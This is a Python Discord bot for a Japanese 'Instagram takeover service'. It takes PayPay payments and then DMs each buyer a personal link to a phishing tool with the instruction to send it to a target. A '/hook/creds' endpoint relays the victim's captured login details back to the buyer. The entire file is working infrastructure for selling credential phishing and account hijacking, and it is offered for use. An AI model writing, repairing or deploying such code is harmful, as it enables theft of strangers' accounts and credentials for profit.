# bot.py ── インスタ乗っ取り代行 / Discord注文ボット
import os
import json
import uuid
import base64
import asyncio
import datetime

import discord
from discord.ext import commands
from dotenv import load_dotenv
from aiohttp import web

import paypay

load_dotenv()

TOKEN         = os.getenv("DISCORD_TOKEN", "")
TOOL_URL      = os.getenv("TOOL_URL", "").rstrip("/") + "/"
OWNER_ID      = int(os.getenv("OWNER_ID", "0") or 0)
FIRST_CONFIRM = os.getenv("PAYPAY_FIRST_CONFIRM", "true") == "true"
PORT          = int(os.getenv("PORT", os.getenv("WEB_PORT", "8080")))
DATA_FILE     = "orders.json"

if not TOKEN:
    raise SystemExit("DISCORD_TOKEN が .env にありません")


# ============================================================
# 保存
# ============================================================
def _load():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print("[db] load error:", e)
    return {"orders": {}, "buyers": {}}


DB = _load()
ORDERS = DB["orders"]


def save():
    tmp = DATA_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(DB, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DATA_FILE)


# ============================================================
# 買い手専用リンク（ref に買い手IDと注文IDを埋め込む）
# ============================================================
def make_ref(buyer_id, oid):
    raw = json.dumps({"b": buyer_id, "o": oid}).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def tool_link(buyer_id, oid):
    return f"{TOOL_URL}?ref={make_ref(buyer_id, oid)}"


# ============================================================
# Discord
# ============================================================
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)


class OrderModal(discord.ui.Modal, title="注文 ── PayPayリンク"):
    link = discord.ui.TextInput(
        label="PayPayリンク",
        placeholder="https://pay.paypay.ne.jp/xxxxxxxx",
        required=True,
    )

    async def on_submit(self, itx: discord.Interaction):
        oid = uuid.uuid4().hex[:10]
        ORDERS[oid] = {
            "buyer": itx.user.id,
            "state": "WAITING_PAYMENT",
            "paypay_link": self.link.value.strip(),
            "created": datetime.datetime.now().isoformat(),
        }
        save()

        first = str(itx.user.id) not in DB["buyers"]
        note = "\n⚠️ **初回のみ**、PayPayの「保留」を確認してください。" if first else ""
        await itx.response.send_message(
            f"✅ 注文を受け付けました（`{oid}`）\n入金を待機中です。{note}",
            ephemeral=True,
        )
        bot.loop.create_task(watch_payment(oid))


class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🛒 注文する", style=discord.ButtonStyle.success,
                       custom_id="panel:order")
    async def order(self, itx: discord.Interaction, _):
        await itx.response.send_modal(OrderModal())


class LinkView(discord.ui.View):
    """買い手に送るリンク用のボタン"""

    def __init__(self, oid):
        super().__init__(timeout=None)
        self.oid = oid
        self.copy_btn.custom_id = f"link:copy:{oid}"
        self.resend_btn.custom_id = f"link:resend:{oid}"

    @discord.ui.button(label="📋 リンクをコピー", style=discord.ButtonStyle.primary)
    async def copy_btn(self, itx: discord.Interaction, _):
        o = ORDERS.get(self.oid)
        if not o:
            await itx.response.send_message("注文が見つかりません", ephemeral=True)
            return
        await itx.response.send_message(
            f"```\n{tool_link(o['buyer'], self.oid)}\n```", ephemeral=True)

    @discord.ui.button(label="🔁 もう一度送る", style=discord.ButtonStyle.secondary)
    async def resend_btn(self, itx: discord.Interaction, _):
        await itx.response.defer()
        await send_link_dm(itx.user, self.oid)


class ConfirmView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=600)
        self.ok = False

    @discord.ui.button(label="受け取る", style=discord.ButtonStyle.success)
    async def y(self, itx: discord.Interaction, _):
        self.ok = True
        await itx.response.send_message("受け取ります")
        self.stop()


# ============================================================
# 買い手へリンクをDM
# ============================================================
async def send_link_dm(buyer: discord.User, oid: str):
    o = ORDERS.get(oid)
    if not o:
        return
    url = tool_link(o["buyer"], oid)
    e = discord.Embed(
        title="🔗 あなた専用のリンクができました",
        color=0xE1306C,
        description=("**このリンクを相手に送ってください。**\n"
                     "相手が開いてログインすると、結果がこのDMに届きます。"),
    )
    e.add_field(name="リンク", value=f"`{url}`", inline=False)
    e.add_field(name="注文ID", value=f"`{oid}`", inline=True)
    try:
        await buyer.send(embed=e, view=LinkView(oid))
    except discord.Forbidden:
        print("[dm] 買い手にDMできません:", buyer.id)


# ============================================================
# 入金監視
# ============================================================
async def watch_payment(oid):
    order = ORDERS.get(oid)
    if not order:
        return
    try:
        buyer = await bot.fetch_user(order["buyer"])
    except Exception as e:
        print("[watch] fetch_user error:", e)
        return

    deadline = asyncio.get_event_loop().time() + 60 * 60 * 24

    while True:
        try:
            st = await paypay.status(order["paypay_link"])
        except Exception as e:
            print("[paypay] status error:", e)
            st = "unpaid"

        if st == "received":
            break

        if st == "pending":
            first = str(order["buyer"]) not in DB["buyers"]
            if first and FIRST_CONFIRM and not order.get("confirmed"):
                order["confirmed"] = await ask_operator(order)
                save()
                if not order["confirmed"]:
                    await asyncio.sleep(15)
                    continue
            try:
                await paypay.receive(order["paypay_link"])
            except Exception as e:
                print("[paypay] receive error:", e)
            break

        if asyncio.get_event_loop().time() > deadline:
            await buyer.send(f"⌛ 入金待ちが24時間経過しました（`{oid}`）")
            return

        await asyncio.sleep(20)

    order["state"] = "LINK_READY"
    DB["buyers"][str(order["buyer"])] = True
    save()
    await send_link_dm(buyer, oid)


async def ask_operator(order):
    try:
        op = await bot.fetch_user(OWNER_ID)
    except Exception:
        return True
    view = ConfirmView()
    await op.send(f"🔔 初回の保留を検知（`{order['paypay_link']}`）。受け取りますか？", view=view)
    await view.wait()
    return view.ok


# ============================================================
# 受信サーバー（/healthz でスピンダウン防止に使える）
# ============================================================
async def healthz(req):
    return web.Response(text="ok")


async def hook_creds(req):
    """app.py から直接DMさせる代わりの受け口（任意）"""
    d = await req.json()
    ref = d.get("ref", "")
    try:
        r = json.loads(base64.urlsafe_b64decode(ref + "=" * (-len(ref) % 4)))
    except Exception:
        r = {}
    if r.get("b") and d.get("embed"):
        try:
            u = await bot.fetch_user(int(r["b"]))
            await u.send(embed=discord.Embed.from_dict(d["embed"]))
        except Exception as e:
            print("[hook] error:", e)
    return web.json_response({"ok": True})


async def start_web():
    app = web.Application()
    app.router.add_get("/healthz", healthz)
    app.router.add_post("/hook/creds", hook_creds)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    print("web on", PORT)


# ============================================================
# 起動
# ============================================================
@bot.event
async def on_ready():
    bot.add_view(PanelView())
    for oid, o in ORDERS.items():
        if o.get("state") in ("LINK_READY", "OPENED"):
            bot.add_view(LinkView(oid))
        if o.get("state") == "WAITING_PAYMENT" and o.get("paypay_link"):
            bot.loop.create_task(watch_payment(oid))
    await start_web()
    print("ready:", bot.user)


@bot.command()
async def panel(ctx):
    await ctx.send("**インスタ乗っ取り代行**\n下のボタンから注文してください。", view=PanelView())


@bot.command()
async def mypage(ctx):
    mine = [(oid, o) for oid, o in ORDERS.items() if o.get("buyer") == ctx.author.id]
    if not mine:
        await ctx.send("注文がありません。")
        return
    lines = [f"`{oid}` {o.get('state', '?')}" for oid, o in mine[-10:]]
    await ctx.send("**あなたの注文**\n" + "\n".join(lines))


bot.run(TOKEN)
